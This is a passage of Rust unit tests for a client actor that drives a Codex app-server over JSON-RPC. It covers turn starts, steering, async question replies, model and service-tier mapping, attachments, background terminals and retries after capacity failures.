            actor.handle_line(&json!({"method":method, "params":{
                    "threadId":"thread_child", "turnId":"T2", "itemId":"message", "delta":"child text",
                    "diff":"", "plan":[], "tokenUsage":{"last":{"inputTokens":12,"outputTokens":3}}
                }}).to_string()).await;
            assert!(events.try_recv().is_err(), "unexpected event for {method}");
        }
        for kind in ["contextCompaction"] {
            for method in ["item/started", "item/updated", "item/completed"] {
                actor.handle_line(&json!({"method":method, "params":{
                        "threadId":"thread_child", "item":{"type":kind,"id":"special","text":"child plan"}
                    }}).to_string()).await;
                assert!(events.try_recv().is_err());
            }
        }
        let _ = actor.child.kill();
        let _ = actor.child.wait();
    });
}

#[test]
fn instructions_ride_additional_context_and_return_after_a_mid_turn_compaction() {
    smol::block_on(async {
        let (mut actor, events) = test_actor();
        actor.instructions =
            Some("<pull_request_linking>\nLink every PR.\n</pull_request_linking>\n\n".into());
        for delivery_id in [1, 2] {
            actor
                .handle_command(SessionCommand::SendTurn {
                    delivery_id,
                    text: "hello".into(),
                    options: None,
                    attachments: Vec::new(),
                })
                .await
                .unwrap();
            let request = sent(&mut actor).await;
            assert_eq!(request["method"], "turn/start");
            assert_eq!(
                request["params"]["additionalContext"],
                json!({"tcode": {"kind": "application", "value": "<pull_request_linking>\nLink every PR.\n</pull_request_linking>\n\n"}})
            );
            assert_eq!(request["params"]["input"][0]["text"], "hello");
        }
        actor
                .handle_line(r#"{"method":"turn/started","params":{"threadId":"thread-1","turn":{"id":"turn-2"}}}"#)
                .await;
        actor
                .handle_line(r#"{"method":"item/started","params":{"threadId":"thread-1","item":{"type":"contextCompaction","id":"compaction"}}}"#)
                .await;
        actor
                .handle_line(r#"{"method":"item/completed","params":{"threadId":"thread-1","item":{"type":"contextCompaction","id":"compaction"}}}"#)
                .await;
        let request = sent(&mut actor).await;
        assert_eq!(request["method"], "thread/inject_items");
        assert_eq!(
            request["params"],
            json!({"threadId": "thread-1", "items": [{
                "type": "message",
                "role": "developer",
                "content": [{"type": "input_text", "text": "<tcode><pull_request_linking>\nLink every PR.\n</pull_request_linking>\n\n</tcode>"}],
            }]})
        );
        let compactions: Vec<bool> = std::iter::from_fn(|| events.try_recv().ok())
            .filter_map(|event| match event {
                AgentEvent::ContextCompacted(c) => Some(c.in_progress),
                _ => None,
            })
            .collect();
        assert_eq!(compactions, [true, false]);
        let _ = actor.child.kill();
        let _ = actor.child.wait();
    });
}

#[test]
fn async_question_answers_steer_the_running_turn_with_codex_reply_envelope() {
    smol::block_on(async {
        let (mut actor, events) = test_actor();
        actor
                .handle_line(r#"{"method":"turn/started","params":{"threadId":"thread-1","turn":{"id":"turn-1"}}}"#)
                .await;
        assert!(matches!(
            events.try_recv().unwrap(),
            AgentEvent::TurnStarted { .. }
        ));
        // `request_user_input_async` as the 0.167.0 schema shapes it (`v2/ThreadItem.ts`, `v2/AsyncUserInputQuestion.ts`).
        actor
                .handle_line(
                    &json!({"method":"item/completed","params":{"threadId":"thread-1","turnId":"turn-1","item":{
                        "type":"agentMessage","id":"call_q","text":"Which DB?\n- Postgres\n- SQLite",
                        "phase":"final_answer","delivery":"async",
                        "questions":[{"title":"Which DB?","options":["Postgres","SQLite"]},{"title":"  ","options":null}]
                    }}})
                    .to_string(),
                )
                .await;
        // The listing text is not an answer; the transcript keeps the call.
        assert!(matches!(
            events.try_recv().unwrap(),
            AgentEvent::ItemCompleted(ThreadItem {
                content: ItemContent::ToolCall { ref name, ref input, .. },
                ..
            }) if name == "request_user_input_async"
                && input["questions"][0]["title"] == "Which DB?"
        ));
        let AgentEvent::UserInputRequested {
            request_id,
            parent_item_id: None,
            questions,
            delivery,
        } = events.try_recv().unwrap()
        else {
            panic!("expected UserInputRequested")
        };
        assert_eq!(request_id, "call_q");
        assert_eq!(delivery, UserInputDelivery::Async);
        assert_eq!(questions.len(), 1, "blank titles are dropped");
        assert_eq!(
            questions[0].id,
            r#"["request_user_input_async","call_q",0]"#
        );
        assert_eq!(questions[0].question, "Which DB?");
        assert_eq!(
            questions[0]
                .options
                .iter()
                .map(|option| option.label.as_str())
                .collect::<Vec<_>>(),
            ["Postgres", "SQLite"]
        );

        let mut answers = serde_json::Map::new();
        answers.insert(questions[0].id.clone(), json!("SQLite"));
        actor
            .handle_command(SessionCommand::RespondUserInput {
                request_id: "call_q".into(),
                answers,
            })
            .await
            .unwrap();
        assert!(matches!(
            events.try_recv().unwrap(),
            AgentEvent::SteerRequested { ref request_id, ref text, .. }
                if request_id == "codex-question-reply-call_q"
                    && text == "> Which DB?\n\nSQLite"
        ));
        assert!(matches!(
            events.try_recv().unwrap(),
            AgentEvent::UserInputResolved { ref request_id, .. } if request_id == "call_q"
        ));
        let request = sent(&mut actor).await;
        assert_eq!(request["method"], "turn/steer");
        assert_eq!(request["params"]["expectedTurnId"], "turn-1");
        let envelope = "<send_user_message_question_reply>\n\
                [{\"answer\":\"SQLite\",\"question\":\"Which DB?\",\
                \"questionItemId\":\"[\\\"request_user_input_async\\\",\\\"call_q\\\",0]\"}]\n\
                </send_user_message_question_reply>";
        assert_eq!(request["params"]["input"][0]["text"], envelope);

        let id = request["id"].as_i64().unwrap();
        actor
            .handle_line(&json!({"id": id, "result": {"turnId": "turn-1"}}).to_string())
            .await;
        actor
            .handle_line(
                &json!({"method":"item/completed","params":{"threadId":"thread-1","item":{
                    "type":"userMessage","id":"u1","content":[{"type":"text","text":envelope}]
                }}})
                .to_string(),
            )
            .await;
        assert!(matches!(
            events.try_recv().unwrap(),
            AgentEvent::SteerAccepted { ref request_id } if request_id == "codex-question-reply-call_q"
        ));

        // Questions still open when the turn ends can no longer be answered.
        actor
                .handle_line(&json!({"method":"item/completed","params":{"threadId":"thread-1","item":{
                    "type":"agentMessage","id":"call_r","text":"Later?","questions":[{"title":"Later?"}]
                }}}).to_string())
                .await;
        assert!(matches!(
            events.try_recv().unwrap(),
            AgentEvent::ItemCompleted(_)
        ));
        assert!(matches!(
            events.try_recv().unwrap(),
            AgentEvent::UserInputRequested { ref request_id, .. } if request_id == "call_r"
        ));
        actor
                .handle_line(&json!({"method":"turn/completed","params":{"threadId":"thread-1","turn":{"id":"turn-1","status":"completed"}}}).to_string())
                .await;
        assert!(matches!(
            events.try_recv().unwrap(),
            AgentEvent::UserInputResolved { ref request_id, ref answers }
                if request_id == "call_r" && answers.is_empty()
        ));
        assert!(matches!(
            events.try_recv().unwrap(),
            AgentEvent::TurnCompleted { .. }
        ));
        assert!(matches!(
            events.try_recv().unwrap(),
            AgentEvent::TurnCheckpoint { .. }
        ));
        let mut answers = serde_json::Map::new();
        answers.insert(
            r#"["request_user_input_async","call_r",0]"#.into(),
            json!("yes"),
        );
        actor
            .handle_command(SessionCommand::RespondUserInput {
                request_id: "call_r".into(),
                answers,
            })
            .await
            .unwrap();
        assert!(matches!(
            events.try_recv().unwrap(),
            AgentEvent::Warning { .. }
        ));
        assert!(events.try_recv().is_err());

        let _ = actor.child.kill();
        let _ = actor.child.wait();
    });
}

#[test]
fn steer_acceptance_waits_for_the_consumed_user_message_echo() {
    smol::block_on(async {
        let (mut actor, events) = test_actor();
        actor
                .handle_line(r#"{"method":"turn/started","params":{"threadId":"thread-1","turn":{"id":"turn-1"}}}"#)
                .await;
        assert!(matches!(
            events.try_recv().unwrap(),
            AgentEvent::TurnStarted { .. }
        ));
        actor
            .handle_command(SessionCommand::Steer {
                request_id: "steer-ok".into(),
                text: "redirect".into(),
                attachments: Vec::new(),
            })
            .await
            .unwrap();
        let request = sent(&mut actor).await;
        let id = request["id"].as_i64().unwrap();
        actor
            .handle_line(&json!({"id": id, "result": {"turnId": "turn-1"}}).to_string())
            .await;
        assert!(
            events.try_recv().is_err(),
            "the turn/steer reply only means the input was enqueued"
        );

        // The turn's own prompt echo arriving late must not be mistaken
        // for the steer.
        actor
                .handle_line(&json!({"method":"item/started","params":{"threadId":"thread-1","item":{
                    "type":"userMessage","id":"u0","content":[{"type":"text","text":"original prompt"}]
                }}}).to_string())
                .await;
        assert!(events.try_recv().is_err());

        for method in ["item/started", "item/completed"] {
            actor
                .handle_line(
                    &json!({"method":method,"params":{"threadId":"thread-1","item":{
                        "type":"userMessage","id":"u1","content":[{"type":"text","text":"redirect"}]
                    }}})
                    .to_string(),
                )
                .await;
        }
        assert!(matches!(
            events.try_recv().unwrap(),
            AgentEvent::SteerAccepted { ref request_id } if request_id == "steer-ok"
        ));
        assert!(
            events.try_recv().is_err(),
            "one echo lifecycle accepts once"
        );

        actor
            .handle_command(SessionCommand::Steer {
                request_id: "steer-error".into(),
                text: "do not accept".into(),
                attachments: Vec::new(),
            })
            .await
            .unwrap();
        let request = sent(&mut actor).await;
        let id = request["id"].as_i64().unwrap();
        actor
            .handle_line(
                &json!({"id": id, "error": {"code": -32000, "message": "rejected"}}).to_string(),
            )
            .await;
        assert!(matches!(
            events.try_recv().unwrap(),
            AgentEvent::SteerRejected { ref request_id } if request_id == "steer-error"
        ));
        actor
                .handle_line(&json!({"method":"item/completed","params":{"threadId":"thread-1","item":{
                    "type":"userMessage","id":"u2","content":[{"type":"text","text":"do not accept"}]
                }}}).to_string())
                .await;
        assert!(
            events.try_recv().is_err(),
            "RPC errors must not accept a steer, even if matching text is echoed"
        );

        let _ = actor.child.kill();
        let _ = actor.child.wait();
    });
}

/// The runtime routes a steer while its own turn flag is still set, but
/// `turn/completed` can already be on the wire. The actor then has no turn
/// to steer into and must say which request it dropped, so the runtime can
/// send the text as a new turn instead of losing it.
#[test]
fn steer_after_turn_completed_is_rejected_by_request_id() {
    smol::block_on(async {
        let (mut actor, events) = test_actor();
        actor
                .handle_line(r#"{"method":"turn/started","params":{"threadId":"thread-1","turn":{"id":"turn-1"}}}"#)
                .await;
        assert!(matches!(
            events.try_recv().unwrap(),
            AgentEvent::TurnStarted { .. }
        ));
        actor
                .handle_line(&json!({"method":"turn/completed","params":{"threadId":"thread-1","turn":{"id":"turn-1","status":"completed"}}}).to_string())
                .await;
        assert!(matches!(
            events.try_recv().unwrap(),
            AgentEvent::TurnCompleted { .. }
        ));
        assert!(matches!(
            events.try_recv().unwrap(),
            AgentEvent::TurnCheckpoint { .. }
        ));
        actor
            .handle_command(SessionCommand::Steer {
                request_id: "steer-late".into(),
                text: "late".into(),
                attachments: Vec::new(),
            })
            .await
            .unwrap();
        assert!(matches!(
            events.try_recv().unwrap(),
            AgentEvent::SteerRejected { ref request_id } if request_id == "steer-late"
        ));
        assert!(
            written(&mut actor).await.is_empty(),
            "no turn/steer request is written without an active turn"
        );

        let _ = actor.child.kill();
        let _ = actor.child.wait();
    });
}

/// A `turn/start` the runtime already accepted but the server rejects gets
/// a synthesized failed completion: no `turn/started` will ever follow, so
/// without it the runtime's turn flag (and the sidebar's "Working" state)
/// would stay set forever.
#[test]
fn rejected_turn_start_synthesizes_failed_completion() {
    smol::block_on(async {
        let (mut actor, events) = test_actor();
        actor
            .handle_command(SessionCommand::SendTurn {
                delivery_id: 7,
                text: "hello".into(),
                options: None,
                attachments: Vec::new(),
            })
            .await
            .unwrap();
        assert!(matches!(
            events.try_recv().unwrap(),
            AgentEvent::TurnAccepted { delivery_id: 7 }
        ));
        let request = sent(&mut actor).await;
        let id = request["id"].as_i64().unwrap();
        actor
            .handle_line(
                &json!({"id": id, "error": {"code": -32000, "message": "model overloaded"}})
                    .to_string(),
            )
            .await;
        assert!(matches!(
            events.try_recv().unwrap(),
            AgentEvent::Error { fatal: false, .. }
        ));
        assert!(matches!(
            events.try_recv().unwrap(),
            AgentEvent::TurnCompleted {
                status: TurnStatus::Failed,
                ..
            }
        ));

        // A rejection that races an already-started turn must not fail it.
        actor
            .handle_command(SessionCommand::SendTurn {
                delivery_id: 8,
                text: "again".into(),
                options: None,
                attachments: Vec::new(),
            })
            .await
            .unwrap();
        let _ = events.try_recv().unwrap(); // TurnAccepted
        let request = sent(&mut actor).await;
        let id = request["id"].as_i64().unwrap();
        // The turn started before Codex refused the duplicate request.
        actor
                .handle_line(r#"{"method":"turn/started","params":{"threadId":"thread-1","turn":{"id":"turn-live"}}}"#)
                .await;
        assert!(matches!(
            events.try_recv().unwrap(),
            AgentEvent::TurnStarted { .. }
        ));
        actor
            .handle_line(
                &json!({"id": id, "error": {"code": -32000, "message": "late duplicate"}})
                    .to_string(),
            )
            .await;
        assert!(matches!(
            events.try_recv().unwrap(),
            AgentEvent::Error { .. }
        ));
        assert!(
            events.try_recv().is_err(),
            "an active turn must not be failed by a stray turn/start rejection"
        );

        let _ = actor.child.kill();
        let _ = actor.child.wait();
    });
}

#[test]
fn maps_model_list_entry_to_spec() {
    let spec = map_model(
        &json!({
            "model": "gpt-5-codex",
            "displayName": "gpt-5-codex",
            "isDefault": true,
            "supportedReasoningEfforts": [
                {"reasoningEffort": "low", "description": "fast"},
                {"reasoningEffort": "medium"},
                {"reasoningEffort": "xhigh"}
            ],
            "defaultReasoningEffort": "medium",
            "serviceTiers": [{"id": "flex", "name": "Flex", "description": "cheap"}],
            "defaultServiceTier": "flex"
        }),
        Some(&model_windows::ModelWindows {
            native: 272_000,
            largest: 872_000,
        }),
    )
    .expect("visible model maps");

    assert_eq!(spec.id, "gpt-5-codex");
    assert!(spec.is_default);
    assert_eq!(spec.options.len(), 3);

    match &spec.options[0] {
        OptionDescriptor::Select {
            role: _,
            apply: _,
            recommended: _,
            permissive: _,
            minimum: _,
            id,
            label: _,
            options,
            default_value,
        } => {
            assert_eq!(id, "reasoningEffort");
            assert_eq!(default_value.as_deref(), Some("medium"));
            assert_eq!(options[0].description.as_deref(), Some("fast"));
        }
        other => panic!("expected reasoning Select, got {other:?}"),
    }
    match &spec.options[1] {
        OptionDescriptor::Select {
            id,
            options,
            default_value,
            ..
        } => {
            assert_eq!(id, "serviceTier");
            assert_eq!(default_value.as_deref(), Some("flex"));
            assert_eq!(options[0].value, "default");
            assert_eq!(options[1].value, "flex");
            assert_eq!(options[1].label, "Flex");
        }
        other => panic!("expected serviceTier Select, got {other:?}"),
    }
    // Native window first and default; the largest one Codex clamps to last.
    match &spec.options[2] {
        OptionDescriptor::Select {
            id,
            options,
            default_value,
            ..
        } => {
            assert_eq!(id, "contextWindow");
            assert_eq!(default_value.as_deref(), Some("272k"));
            assert_eq!(options[0].value, "272k");
            assert_eq!(options[1].label, "872k");
            assert_eq!(options.len(), 2);
        }
        other => panic!("expected contextWindow Select, got {other:?}"),
    }
}

/// `v2/Model.ts` `serviceTiers` (codex 0.167.0); which of them are fast
/// mode is ChatGPT.app's rule (26.1103).
#[test]
fn hidden_model_is_skipped_and_fast_tiers_say_so() {
    assert!(
        map_model(
            &json!({"model": "secret", "displayName": "secret", "hidden": true}),
            None
        )
        .is_none()
    );

    let spec = map_model(
        &json!({
            "model": "gpt-x",
            "displayName": "gpt-x",
            "supportedReasoningEfforts": [],
            "serviceTiers": [
                {"id": "priority", "name": "Fast", "description": ""},
                {"id": "flex", "name": "Flex", "description": ""},
                {"id": "ultrafast", "name": "Ultrafast", "description": ""}
            ],
            "defaultServiceTier": null
        }),
        None,
    )
    .unwrap();
    // Empty reasoning efforts → no reasoning descriptor: serviceTier, then
    // a contextWindow selector without presets (no cached windows).
    assert_eq!(spec.options.len(), 2);
    match &spec.options[0] {
        OptionDescriptor::Select {
            id, options, role, ..
        } => {
            assert_eq!(id, "serviceTier");
            assert_eq!(*role, crate::OptionRole::Speed);
            assert_eq!(
                options
                    .iter()
                    .map(|option| (option.value.as_str(), option.speed))
                    .collect::<Vec<_>>(),
                [
                    ("default", None),
                    ("priority", Some(Speed::Fast)),
                    ("flex", None),
                    ("ultrafast", Some(Speed::Ultrafast)),
                ]
            );
        }
        other => panic!("expected serviceTier Select, got {other:?}"),
    }
    match &spec.options[1] {
        OptionDescriptor::Select {
            id,
            options,
            default_value,
            ..
        } => {
            assert_eq!(id, "contextWindow");
            assert!(options.is_empty());
            assert_eq!(default_value, &None);
        }
        other => panic!("expected contextWindow Select, got {other:?}"),
    }
}

/// Codex takes an image as a `data:` URL and a sound by its file's path
/// (`localAudio`); a PDF or any other file reaches it as its path after the
/// text.
#[test]
fn turn_input_carries_images_and_sounds_and_other_files_by_path() {
    let file = |media_type: &str, path: &str| Attachment {
        media_type: media_type.into(),
        data_base64: "AAAA".into(),
        source_path: Some(path.into()),
    };
    let attachments = vec![
        file("image/png", "/up/a.png"),
        file("audio/wav", "/up/c.wav"),
        file("application/pdf", "/up/b.pdf"),
    ];
    assert_eq!(
        user_input("what is this?", &attachments),
        json!([
            { "type": "text", "text": "what is this?\n\n/up/b.pdf", "text_elements": [] },
            { "type": "image", "url": "data:image/png;base64,AAAA" },
            { "type": "localAudio", "path": "/up/c.wav" },
        ])
    );
}

#[test]
fn skills_list_response_parses_to_provider_commands() {
    let result = json!({
        "data": [
            {
                "cwd": "/tmp",
                "skills": [
                    {"name": "browser:control", "description": "drive the browser", "interface": {"displayName": "Browser"}},
                    {"name": "", "description": "dropped"}
                ]
            },
            {"cwd": "/tmp", "skills": [{"name": "browser:control", "description": "dup dropped"}]}
        ]
    });
    let commands = parse_codex_skills(&result);
    assert_eq!(commands.len(), 1);
    assert_eq!(commands[0].name, "browser:control");
    assert_eq!(commands[0].kind, ProviderCommandKind::Skill);
    assert_eq!(
        commands[0].description.as_deref(),
        Some("drive the browser")
    );
}

/// A configured codex that dies at startup (as a broken npm install does)
/// says why in the startup error: its exit status and its stderr, not
/// just "exited during startup". `cat app-server` is such a process.
#[cfg(unix)]
#[test]
fn startup_failure_reports_exit_status_and_stderr_tail() {
    let message = smol::block_on(list_models(
        Some(PathBuf::from("/bin/cat")),
        LaunchEnv::default(),
        &Default::default(),
    ))
    .unwrap_err()
    .to_string();
    assert!(
        message.contains("cat: app-server: No such file or directory"),
        "{message}"
    );
    assert!(message.contains("exit status: 1"), "{message}");
}

/// A running app-server answers a usage read itself:
/// `account/rateLimits/read` goes out on the live connection and its
/// result reaches the asker, so no second server is started for it.
#[test]
fn a_usage_read_asks_the_running_app_server() {
    smol::block_on(async {
        let (mut actor, _events) = test_actor();
        let (reply, answer) = smol::channel::bounded(1);
        actor
            .handle_command(SessionCommand::ReadAccountUsage { reply })
            .await
            .unwrap();
        let request = sent(&mut actor).await;
        assert_eq!(request["method"], "account/rateLimits/read");
        let result = json!({"rateLimits": {"planType": "pro"}});
        actor
            .handle_line(&json!({"id": request["id"], "result": result}).to_string())
            .await;
        assert_eq!(answer.try_recv().unwrap().unwrap(), result);
    });
}

/// What is written to a running command's stdin is part of the command:
/// each line it finishes, as ChatGPT.app lists them (a backspace takes
/// back a character, ^C drops the line so far), and the item Codex
/// completes keeps them. Shapes from the 0.167.0 schema
/// (`v2/TerminalInteractionNotification.ts`, `v2/ThreadItem.ts`).
#[test]
fn the_lines_typed_into_a_command_are_part_of_it() {
    smol::block_on(async {
        let (mut actor, events) = test_actor();
        let item = |status: &str| {
            json!({"threadId":"thread-1","turnId":"T1","item":{
                "type":"commandExecution","id":"call_repl","command":"python3 -i",
                "cwd":"/work/example","processId":"7","status":status,
                "commandActions":[],"aggregatedOutput":null,"exitCode":null,"durationMs":null
            }})
        };
        actor
            .handle_notification("item/started", &item("inProgress"))
            .await;
        while events.try_recv().is_ok() {}
        for stdin in [
            "print(1)\n",
            "prx\u{7f}int(2",
            ")\nimport os\u{3}",
            "\nexit()\n",
        ] {
            actor
                .handle_notification(
                    "item/commandExecution/terminalInteraction",
                    &json!({"threadId":"thread-1","turnId":"T1","itemId":"call_repl",
                            "processId":"7","stdin":stdin}),
                )
                .await;
        }
        actor
            .handle_notification("item/completed", &item("completed"))
            .await;
        let mut last = None;
        while let Ok(event) = events.try_recv() {
            last = Some(event);
        }
        let Some(AgentEvent::ItemCompleted(item)) = last else {
            panic!("expected the completed command: {last:?}");
        };
        let ItemContent::CommandExecution { input, .. } = item.content else {
            panic!("expected a command: {:?}", item.content);
        };
        assert_eq!(input, ["print(1)", "print(2)", "exit()"]);
        let _ = actor.child.kill();
        let _ = actor.child.wait();
    });
}

#[test]
fn background_terminals_are_listed_read_again_and_stopped() {
    smol::block_on(async {
        let (mut actor, events) = test_actor();
        let answer = async |actor: &mut Actor, request: &Value, result: Value| {
            let response = json!({"id": request["id"], "result": result}).to_string();
            actor.handle_line(&response).await;
        };

        actor
            .handle_notification(
                "turn/completed",
                &json!({"threadId": "thread-1", "turn":{"id":"T1","status":"completed"}}),
            )
            .await;
        while events.try_recv().is_ok() {}
        actor.wake().await.unwrap();
        let list = sent(&mut actor).await;
        assert_eq!(list["method"], "thread/backgroundTerminals/list");
        assert_eq!(list["params"], json!({"threadId": "thread-1"}));
        // `v2/ThreadBackgroundTerminalsListResponse.ts` of the 0.167.0 schema.
        let running = json!({"data":[{
                "itemId":"call_1","processId":"98412","command":"sleep 40",
                "cwd":"/tmp/project","osPid":null,"cpuPercent":null,"rssKb":null
            }],"nextCursor":null});
        answer(&mut actor, &list, running.clone()).await;
        assert!(
            matches!(
                events.try_recv(),
                Ok(AgentEvent::ItemBackgrounded { item_id, parent_item_id: None })
                    if item_id == "call_1"
            ),
            "the call that started it went on in the background"
        );
        let listed = events.try_recv().unwrap();
        let AgentEvent::BackgroundTaskList { tasks } = &listed else {
            panic!("expected the list: {listed:?}");
        };
        assert_eq!(
            (
                tasks[0].id.as_str(),
                tasks[0].name.as_str(),
                tasks[0].item_id.as_deref()
            ),
            ("98412", "sleep 40", Some("call_1"))
        );
        assert!(matches!(
            events.try_recv(),
            Ok(AgentEvent::BackgroundTasksChanged { count: 1 })
        ));

        actor.wake().await.unwrap();
        let again = sent(&mut actor).await;
        answer(&mut actor, &again, running).await;
        assert!(events.try_recv().is_err(), "an unchanged list says nothing");

        actor
            .handle_command(SessionCommand::StopBackgroundTask {
                task_id: Some("98412".into()),
            })
            .await
            .unwrap();
        let terminate = sent(&mut actor).await;
        assert_eq!(terminate["method"], "thread/backgroundTerminals/terminate");
        assert_eq!(
            terminate["params"],
            json!({"threadId": "thread-1", "processId": "98412"})
        );
        answer(&mut actor, &terminate, json!({"terminated": true})).await;

        let list = sent(&mut actor).await;
        assert_eq!(list["method"], "thread/backgroundTerminals/list");
        answer(&mut actor, &list, json!({"data":[],"nextCursor":null})).await;
        assert!(matches!(
            events.try_recv(),
            Ok(AgentEvent::BackgroundTaskList { tasks }) if tasks.is_empty()
        ));
        assert!(matches!(
            events.try_recv(),
            Ok(AgentEvent::BackgroundTasksChanged { count: 0 })
        ));

        actor
            .handle_command(SessionCommand::StopBackgroundTask { task_id: None })
            .await
            .unwrap();
        let clean = sent(&mut actor).await;
        assert_eq!(clean["method"], "thread/backgroundTerminals/clean");
        assert_eq!(clean["params"], json!({"threadId": "thread-1"}));
        let refusal =
            json!({"id": clean["id"], "error": {"code": -32600, "message": "no such thread"}});
        actor.handle_line(&refusal.to_string()).await;
        assert!(
            matches!(
                events.try_recv(),
                Ok(AgentEvent::Error { message, fatal: false })
                    if message.contains("thread/backgroundTerminals/clean")
                        && message.contains("no such thread")
            ),
            "a refused stop says why"
        );
        let list = sent(&mut actor).await;
        assert_eq!(list["method"], "thread/backgroundTerminals/list");
        let _ = actor.child.kill();
        let _ = actor.child.wait();
    });
}

#[test]
fn a_new_model_and_effort_go_out_with_the_next_turn() {
    smol::block_on(async {
        let (mut actor, events) = test_actor();
        let select = |id: &str, value: Value| OptionSelection {
            id: id.into(),
            value,
        };
        actor
            .handle_command(SessionCommand::ApplySettings {
                model: Some("gpt-5.5".into()),
                option_selections: vec![
                    select("reasoningEffort", json!("high")),
                    select("serviceTier", json!("fast")),
                ],
            })
            .await
            .unwrap();
        assert!(matches!(
            events.try_recv(),
            Ok(AgentEvent::SettingsApplied { applied: true })
        ));
        let params = actor.build_turn_params("next", None, &[]);
        assert_eq!(params["collaborationMode"]["settings"]["model"], "gpt-5.5");
        assert_eq!(params["effort"], "high");
        assert_eq!(params["serviceTier"], "fast");

        // A context window is thread config, fixed when the thread starts.
        actor
            .handle_command(SessionCommand::ApplySettings {
                model: Some("gpt-5.4".into()),
                option_selections: vec![select("contextWindow", json!("272k"))],
            })
            .await
            .unwrap();
        assert!(matches!(
            events.try_recv(),
            Ok(AgentEvent::SettingsApplied { applied: false })
        ));
        assert_eq!(
            actor.build_turn_params("next", None, &[])["collaborationMode"]["settings"]["model"],
            "gpt-5.5"
        );
        let _ = actor.child.kill();
        let _ = actor.child.wait();
    });
}

/// A turn that fails on an overloaded server offers Retry with no
/// countdown, as ChatGPT.app 26.1103 does against app-server 0.162.0-alpha.18
/// and later. Retry continues the thread with empty input, once, even when
/// the background-terminal read the failed turn scheduled has come due.
#[test]
fn capacity_failure_offers_a_manual_retry() {
    smol::block_on(async {
        let (mut actor, events) = test_actor();
        actor
            .handle_notification(
                "turn/started",
                &json!({"threadId": "thread-1", "turn": {"id": "overloaded"}}),
            )
            .await;
        // `v2/TurnCompletedNotification.ts` and `v2/TurnError.ts` of 0.167.0.
        actor
            .handle_line(
                &json!({"method": "turn/completed", "params": {
                        "threadId": "thread-1",
                        "turn": {"id": "overloaded", "rootTurnId": null, "items": [],
                            "itemsView": "summary", "status": "failed",
                            "error": {"message": "Selected model is at capacity.",
                                "codexErrorInfo": "serverOverloaded",
                                "additionalDetails": null, "misalignment": null},
                            "startedAt": 1767225600, "completedAt": 1767225601,
                            "durationMs": 1000}}})
                .to_string(),
            )
            .await;
        let offered: Vec<_> = std::iter::from_fn(|| events.try_recv().ok())
            .filter_map(|event| match event {
                AgentEvent::TurnRetry { retry } => Some(retry),
                _ => None,
            })
            .collect();
        assert_eq!(
            offered,
            [Some(crate::TurnRetry {
                turn_id: "overloaded".into(),
                retry_at: None,
            })]
        );
        actor
            .handle_command(SessionCommand::RetryTurn {
                turn_id: "overloaded".into(),
            })
            .await
            .unwrap();
        let request = sent(&mut actor).await;
        assert_eq!(request["method"], "turn/start");
        assert_eq!(request["params"]["threadId"], "thread-1");
        assert_eq!(request["params"]["input"], json!([]));
        // A second client cannot submit the same retry while start is pending.
        actor
            .handle_command(SessionCommand::RetryTurn {
                turn_id: "overloaded".into(),
            })
            .await
            .unwrap();
        assert!(written(&mut actor).await.is_empty());
        actor
            .handle_line(
                &json!({"id": request["id"], "result": {"turn": {"id": "continued"}}}).to_string(),
            )
            .await;
        actor
            .handle_command(SessionCommand::Interrupt)
            .await
            .unwrap();
        actor
            .handle_notification(
                "turn/started",
                &json!({"threadId": "thread-1", "turn": {"id": "continued"}}),
            )
            .await;
        assert_eq!(sent(&mut actor).await["method"], "turn/interrupt");
        let _ = actor.child.kill();
        let _ = actor.child.wait();
    });
}

#[test]
fn capacity_retry_cancellation_and_non_capacity_failures_do_not_restart() {
    smol::block_on(async {
        let (mut actor, events) = test_actor();
        for error in [
            "usageLimitExceeded",
            "internalServerError",
            "serverOverloaded",
        ] {
            actor
                .handle_notification(
                    "turn/started",
                    &json!({"threadId": "thread-1", "turn":{"id":error}}),
                )
                .await;
            actor
                .handle_notification(
                    "turn/completed",
                    &json!({"threadId": "thread-1", "turn":{"id":error,"status":"failed",
                    "error":{"message":"capacity","codexErrorInfo":error}}}),
                )
                .await;
            let offers = std::iter::from_fn(|| events.try_recv().ok())
                .filter(|event| matches!(event, AgentEvent::TurnRetry { retry: Some(_) }))
                .count();
            assert_eq!(offers, usize::from(error == "serverOverloaded"));
        }
        actor
            .handle_command(SessionCommand::Interrupt)
            .await
            .unwrap();
        assert!(matches!(
            events.try_recv(),
            Ok(AgentEvent::TurnRetry { retry: None })
        ));
        actor
            .handle_command(SessionCommand::RetryTurn {
                turn_id: "serverOverloaded".into(),
            })
            .await
            .unwrap();
        assert!(written(&mut actor).await.is_empty());
        let _ = actor.child.kill();
        let _ = actor.child.wait();
    });
}

#[test]
fn model_rerouted_notification_maps_served_model_with_reason() {
    smol::block_on(async {
        let (mut actor, events) = test_actor();
        actor
            .handle_notification(
                "model/rerouted",
                &json!({
                    "threadId": "thread-1", "turnId": "turn-1",
                    "fromModel": "gpt-5.5", "toModel": "gpt-5.4",
                    "reason": "highRiskCyberActivity"
                }),
            )
            .await;
        assert!(matches!(
            events.try_recv().unwrap(),
            AgentEvent::ServedModel { model, from, reason }
                if model == "gpt-5.4"
                    && from.as_deref() == Some("gpt-5.5")
                    && reason.as_deref() == Some("highRiskCyberActivity")
        ));
        let _ = actor.child.kill();
        let _ = actor.child.wait();
    });
}

#[test]
fn turn_diff_notification_maps_to_exact_replacement_snapshot() {
    smol::block_on(async {
        let (mut actor, events) = test_actor();
        actor
            .handle_notification(
                "turn/diff/updated",
                &json!({
                    "threadId": "thread-1",
                    "turnId": "turn-9",
                    "diff": concat!(
                        "diff --git a/src/lib.rs b/src/lib.rs\n",
                        "--- a/src/lib.rs\n",
                        "+++ b/src/lib.rs\n",
                        "@@ -1 +1 @@\n",
                        "-old\n",
                        "+new\n"
                    )
                }),
            )
            .await;

        assert!(matches!(
            events.try_recv().unwrap(),
            AgentEvent::TurnChangesUpdated {
                turn_id,
                completeness: ChangeCompleteness::Exact,
                changes,
            } if turn_id == "turn-9"
                && changes.len() == 1
                && changes[0].path == "src/lib.rs"
                && changes[0].kind == FileChangeKind::Modify
        ));
        let _ = actor.child.kill();
        let _ = actor.child.wait();
    });
}

#[test]
fn native_plan_items_stream_as_plans() {
    smol::block_on(async {
        let (mut actor, events) = test_actor();
        actor
            .handle_notification(
                "item/started",
                &json!({"threadId": "thread-1", "turnId": "turn-1", "startedAtMs": 1,
                        "item": {"type": "plan", "id": "native-plan", "text": ""}}),
            )
            .await;
        assert!(matches!(
            events.try_recv().unwrap(),
            AgentEvent::ItemStarted(ThreadItem {
                content: ItemContent::Plan { .. },
                ..
            })
        ));
        actor
            .handle_notification(
                "item/plan/delta",
                &json!({"threadId": "thread-1", "turnId": "turn-1",
                        "itemId": "native-plan", "delta": "# Native plan"}),
